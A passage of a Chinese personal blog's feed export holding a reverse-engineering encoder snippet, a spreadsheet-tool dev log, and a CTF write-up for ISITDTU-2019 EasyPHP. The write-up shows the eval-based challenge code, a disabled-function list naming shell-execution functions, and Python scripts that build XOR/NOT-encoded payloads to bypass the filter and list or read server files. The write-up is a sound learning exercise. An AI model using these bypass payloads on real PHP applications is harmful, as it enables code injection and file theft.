<span class="token function">HexToBeast</span><span class="token punctuation">(</span>temphex<span class="token punctuation">)</span><span class="token punctuation">:</span>    beast <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temphex<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tempdec <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temphex<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> i <span class="token operator">%</span> <span class="token number">16</span>  <span class="token comment"># 十六进制字符串转为int类型的十进制</span>        <span class="token keyword">if</span> tempdec <span class="token operator">>=</span> <span class="token number">16</span><span class="token punctuation">:</span>            tempdec <span class="token operator">-=</span> <span class="token number">16</span>        beast <span class="token operator">+=</span> ch<span class="token punctuation">[</span>tempdec <span class="token operator">//</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> ch<span class="token punctuation">[</span>tempdec <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span>    beast <span class="token operator">=</span> <span class="token string">'~呜嗷'</span> <span class="token operator">+</span> beast <span class="token operator">+</span> <span class="token string">'啊'</span>    <span class="token keyword">return</span> beastc <span class="token operator">=</span> HexToBeast<span class="token punctuation">(</span>ToHex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'密文为:'</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">BeastToText</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    text <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>    out <span class="token operator">=</span> <span class="token string">''</span>    char <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pos1<span class="token punctuation">,</span> pos2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>        c <span class="token operator">=</span> text<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">while</span> pos1 <span class="token operator">&lt;=</span> <span class="token number">3</span> <span class="token keyword">and</span> c <span class="token operator">!=</span> ch<span class="token punctuation">[</span>pos1<span class="token punctuation">]</span><span class="token punctuation">:</span>            pos1 <span class="token operator">+=</span> <span class="token number">1</span>        c2 <span class="token operator">=</span> text<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">while</span> pos2 <span class="token operator">&lt;=</span> <span class="token number">3</span> <span class="token keyword">and</span> c2 <span class="token operator">!=</span> ch<span class="token punctuation">[</span>pos2<span class="token punctuation">]</span><span class="token punctuation">:</span>            pos2 <span class="token operator">+=</span> <span class="token number">1</span>        temp <span class="token operator">=</span> <span class="token punctuation">(</span>pos1 <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> pos2 <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> temp <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            temp <span class="token operator">+=</span> <span class="token number">16</span>        char <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> char<span class="token punctuation">:</span>                <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">:</span>                    char <span class="token operator">=</span> char<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">break</span>            out <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            char <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">return</span> outjie <span class="token operator">=</span> BeastToText<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'解密后为:'</span><span class="token punctuation">,</span> jie<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="加到我的小QQbot里面去嘿嘿，太爽了，（没加壳的）逆向太好玩了"><a href="#加到我的小QQbot里面去嘿嘿，太爽了，（没加壳的）逆向太好玩了" class="headerlink" title="加到我的小QQbot里面去嘿嘿，太爽了，（没加壳的）逆向太好玩了"></a>加到我的小QQbot里面去嘿嘿，太爽了，（没加壳的）逆向太好玩了</h2><p>终于应该算是看到逆向的门了。太感动了。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安卓逆向 </tag>
            
            <tag> 加密算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>表格数据提取软件开发日志</title>
      <link href="2021/04/21/%E8%A1%A8%E6%A0%BC%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97/"/>
      <url>2021/04/21/%E8%A1%A8%E6%A0%BC%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>为了锻炼写开发日志的能力才写了这个软件，emmm，多少有点舍本逐末？</strong></p><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>开发一款基于pyqt5与名为xlrd的python库的数据提取软件，目的就是:<code>为了解决在面对大量需要处理的数据时要一个一个地查找的问题</code>。</p><h2 id="使用到的语言"><a href="#使用到的语言" class="headerlink" title="使用到的语言"></a>使用到的语言</h2><p>1.python</p><p>2.json（可能会将提取到的数据存储到json文件之中，还懒得学sqlite）（未使用，直接使用了变量<code>因为数据量本身并不大</code>）</p><h2 id="单列所有数值数据提取"><a href="#单列所有数值数据提取" class="headerlink" title="单列所有数值数据提取"></a>单列所有数值数据提取</h2><h3 id="一个文档，但是含有多个sheet的表"><a href="#一个文档，但是含有多个sheet的表" class="headerlink" title="一个文档，但是含有多个sheet的表"></a>一个文档，但是含有多个sheet的表</h3><p>1.首先找到需要提取数据的sheetname从而定位一张表（单个列数据）。</p><p>2.找到表之后再找到是第几列，从而定位一列。</p><p>3.提取查找的列名的下部的值。</p><p><code>思路是每列数值数据都存到json文件之中，所有的存到一个文件之中，每一列的数值以所在的表名进行区分</code></p><h2 id="2021年4月21日23-54-26"><a href="#2021年4月21日23-54-26" class="headerlink" title="2021年4月21日23:54:26"></a>2021年4月21日23:54:26</h2><p>开发刚刚开始，ui还没设计，后端的代码也刚刚开始。</p><h2 id="2021年4月23日22-03-41"><a href="#2021年4月23日22-03-41" class="headerlink" title="2021年4月23日22:03:41"></a>2021年4月23日22:03:41</h2><p><img src="/2021/04/21/%E8%A1%A8%E6%A0%BC%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97/20210423220236-1619186806091.png" alt="20210423220236"></p><p>意外突发，需求变得简单的一批，所以小软件已经近乎完成，逻辑已经基本好了，就差对界面与用户体验进行极度优化了，这个其实不优化也无伤大雅，但是对于半拉强迫症的我来说这点小瑕疵也是不允许的，所以明天再说嘿嘿嘿。</p><p><strong>已完成：对excel文件里面的各个数据表自动进行文理科分流并对文科的数据进行提取与计算平均分，主要功能还是<code>可以指定科目与前多少名</code></strong></p><h2 id="2021年4月24日12-21-48"><a href="#2021年4月24日12-21-48" class="headerlink" title="2021年4月24日12:21:48"></a>2021年4月24日12:21:48</h2><p>需求再次发生变化，要修改为，实现下面的功能。</p><p>1.输入班级，生成并显示该班级的所有科目的平均分</p><p>2.对各个班级排名（可有可无）</p><p>3.不再分文理科）</p><h2 id="总部，总部，OVER"><a href="#总部，总部，OVER" class="headerlink" title="总部，总部，OVER"></a>总部，总部，OVER</h2><p>完成，作品对问价你的格式具有针对性，所以就不把代码分享出来了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pyqt5 </tag>
            
            <tag> 软件开发日志 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISITDTU-2019-EasyPHP</title>
      <link href="2021/04/20/ISITDTU-2019-EasyPHP/"/>
      <url>2021/04/20/ISITDTU-2019-EasyPHP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="/2021/04/20/ISITDTU-2019-EasyPHP/image-20210423204629108.png" alt="啊这"></p><h2 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$_</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'rosé will not do it'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xd</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'you are so close, omg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>前面的那个正则过滤大概就是过滤了下面的这些字符，借鉴师傅博客</p><pre class="line-numbers language-none"><code class="language-none">\x00- 0-9                       匹配\x00到空格(\x20)，0-9的数字&#39;&quot;&#96;$&amp;.,|[&#123;_defgops              匹配这些字符\x7F                            匹配DEL(\x7F)字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>而下面的这个if语句实现的效果是，所传入的变量里面的所有不同的字符的个数不能超过十六进制的<code>0xd</code>也就是十进制的<code>13</code>，就是payload里面所有字符的总数不能超过13个就可了</p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="fuzz可用方法"><a href="#fuzz可用方法" class="headerlink" title="fuzz可用方法"></a>fuzz可用方法</h3><p>然后就是如何bypass了，这里可以看到并没有过滤到<code>^</code>，<code>~</code>这两个字符，所以可以使用取反绕过试一试，</p><p>但是一般情况下可以先写个脚本看看还有那些函数是可以用的。<code>php可用方法fuzz脚本</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$array</span><span class="token operator">=</span><span class="token function">get_defined_functions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//返回所有内置定义函数</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'internal'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token comment">//遍历所有方法</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[\x00- 0-9\'"\`$&amp;.,|[&#123;_defgops\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xd</span> <span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;br/>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所的结果如下</p><pre class="line-numbers language-function" data-language="function"><code class="language-function">rtrimtrimltrimchrlinkunlinktanatanatanhtanhintvalmailminmax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然这里没什么能用的，但是这个fuzz的脚本还是很有启发性的，遇到bypass的时候可以先用这样的脚本试一试是不是能够直接用某些危险方法。</p><h3 id="异或-url编码bypass"><a href="#异或-url编码bypass" class="headerlink" title="异或+url编码bypass"></a>异或+url编码bypass</h3><p>这里直接使用取反的那个操作，下面是代码。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token single-quoted-string string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/04/20/ISITDTU-2019-EasyPHP/image-20210421001553136.png" alt="出来phpinfo了"></p><p>虽然出来了，但是其实没啥用，因为<code>phpinfo();</code>本来的字符数就没有超过13个，接下来就是缩短字符数与看未被禁用的函数了，下面是被disabled的方法</p><pre class="line-numbers language-none"><code class="language-none">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我就认识三个可以命令执行的方法，但是没过滤扫目录的函数<code>scandir()</code>，还有读文件的函数<code>readfile()</code>，还有打印变量信息的函数<code>var_dump()</code>，我借鉴的那个wp里面用的是用多次使用<code>^</code>和<code>()</code>来异或的方式，这里我也这么做，但是条条大路通罗马，肯定还有不少其他方法，这里就不复现了，遇到了再说吧。</p><h3 id="bypass脚本实现"><a href="#bypass脚本实现" class="headerlink" title="bypass脚本实现"></a>bypass脚本实现</h3><p>这里我们想传入的变量信息是这样的</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看看有多少个字符</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$s &#x3D; &quot;print_r(scandir(&#39;.&#39;));&quot;;$a &#x3D; strlen(count_chars(strtolower($s), 0x3));echo($a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/04/20/ISITDTU-2019-EasyPHP/image-20210421002956082.png" alt="image-20210421002956082"></p><p>表面上是15个字符，但是其实还有<code>^</code>也要用，就是16个了，参考脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">result2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x9b</span><span class="token punctuation">,</span> <span class="token number">0xa0</span><span class="token punctuation">,</span> <span class="token number">0x9c</span><span class="token punctuation">,</span> <span class="token number">0x8f</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x9e</span><span class="token punctuation">,</span> <span class="token number">0xd1</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x8d</span><span class="token punctuation">,</span> <span class="token number">0x8c</span><span class="token punctuation">]</span>  <span class="token comment"># Original chars,11 total</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x9b</span><span class="token punctuation">,</span> <span class="token number">0xa0</span><span class="token punctuation">,</span> <span class="token number">0x9c</span><span class="token punctuation">,</span> <span class="token number">0x8f</span><span class="token punctuation">,</span> <span class="token number">0x9e</span><span class="token punctuation">,</span> <span class="token number">0xd1</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x8c</span><span class="token punctuation">]</span>  <span class="token comment"># to be deleted</span>temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> d <span class="token keyword">in</span> result2<span class="token punctuation">:</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> result<span class="token punctuation">:</span>        <span class="token keyword">for</span> b <span class="token keyword">in</span> result<span class="token punctuation">:</span>            <span class="token keyword">for</span> c <span class="token keyword">in</span> result<span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">^</span> b <span class="token operator">^</span> c <span class="token operator">==</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> a <span class="token operator">==</span> b <span class="token operator">==</span> c <span class="token operator">==</span> d<span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a=0x%x,b=0x%x,c=0x%x,d=0x%x"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">if</span> d <span class="token keyword">not</span> <span class="token keyword">in</span> temp<span class="token punctuation">:</span>                            temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">,</span> temp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个就是用几个有的替代要删掉的就行。然后还有个跟<code>%ff</code>异或的问题，就是一个字符的十六进制形式与<code>0xff</code>进行两次异或之后还是原来的字符，<code>而与0xff（int值为255）进行一次异或之后一般是ascii码值大于128的不可见字符，然后^字符不会被过滤的话，就能实现bypass</code>，所以根据这个原理有下面的生成payload的脚本<code>(借鉴了一些之后原创的嗷，就是没实现自动化生成payload，要手动添加)</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-#</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token comment"># Name:         ctf</span><span class="token comment"># Description:  复现脚本</span><span class="token comment"># Author:       M4XLMUM</span><span class="token comment"># Date:         2021/4/12</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token keyword">import</span> operator<span class="token comment"># s = ['print_r', 'scandir', '.']  # 更换成为想要的字符串</span>s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'readfile'</span><span class="token punctuation">,</span> <span class="token string">'end'</span><span class="token punctuation">,</span> <span class="token string">'scandir'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">]</span>  <span class="token comment"># 更换成为想要的字符串</span>ans <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>pattern <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>s2 <span class="token operator">=</span> <span class="token string">''</span>    <span class="token comment"># 需要进行替换的字符, 假设只对出现一次的字符串进行替换。</span><span class="token comment"># 统计s列表中的字符的出现次数</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    ans<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> ans<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">)</span>keys <span class="token operator">=</span> ans<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> keys<span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> keys<span class="token punctuation">:</span>            <span class="token keyword">for</span> m <span class="token keyword">in</span> keys<span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> j <span class="token operator">==</span> k <span class="token keyword">or</span> j <span class="token operator">==</span> m <span class="token keyword">or</span> m <span class="token operator">==</span> k<span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        flag <span class="token operator">=</span> <span class="token number">1</span>                        <span class="token keyword">for</span> temp <span class="token keyword">in</span> pattern<span class="token punctuation">:</span>                            <span class="token keyword">if</span> i <span class="token keyword">in</span> temp <span class="token keyword">and</span> j <span class="token keyword">in</span> temp <span class="token keyword">and</span> k <span class="token keyword">in</span> temp <span class="token keyword">and</span> m <span class="token keyword">in</span> temp<span class="token punctuation">:</span>                                flag <span class="token operator">=</span> <span class="token number">0</span>                        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>                            pattern<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token operator">+</span>j<span class="token operator">+</span>k<span class="token operator">+</span>m<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''经测试，此块无用geigeigei# 对几对一组的字符串中字符出现次数进行排序，并找出需要进行替换的字符`s2`temp = &#123;&#125;for i in ''.join(pattern):    npattern[i] = ''.join(pattern).count(i)# npattern = sorted(temp.items(), key=operator.itemgetter(1))for i in npattern:    if npattern[i] == 1:        s2 += i# %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'''</span><span class="token keyword">print</span><span class="token punctuation">(</span>pattern<span class="token punctuation">)</span>  <span class="token comment"># 打印出pattern之后自己识别需要替换哪一个字符。</span><span class="token triple-quoted-string string">'''懒得写自动化脚本了，我的小脑子想不太出来这里的四个字符组成一组的原理实际上就是采用了异或计算的性质，即四个字符中，如果任意三个字符的异或等于另一个，那么这四个字符中任意三个的异或等于另一个字符。这里的结果是:['prca', 'ints', 'incd', 'tscd']那需要替换的可以是：p == r^c^a, i == n^c^d, t == s^c^d'''</span><span class="token comment"># 替换字符为十六进制的形式</span><span class="token comment"># temp = &#123;'p': 'rca', 'i': 'ncd', 't': 'scd'&#125;</span>temp <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'r'</span><span class="token punctuation">:</span> <span class="token string">'eds'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token string">'dfc'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">:</span> <span class="token string">'fln'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">:</span> <span class="token string">'flc'</span><span class="token punctuation">&#125;</span>rtable <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>   <span class="token comment"># 需要进行替换的表(已转为十六进制)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> temp<span class="token punctuation">:</span>    tempkey <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">)</span>    tempvalue <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>        tempvalue <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span 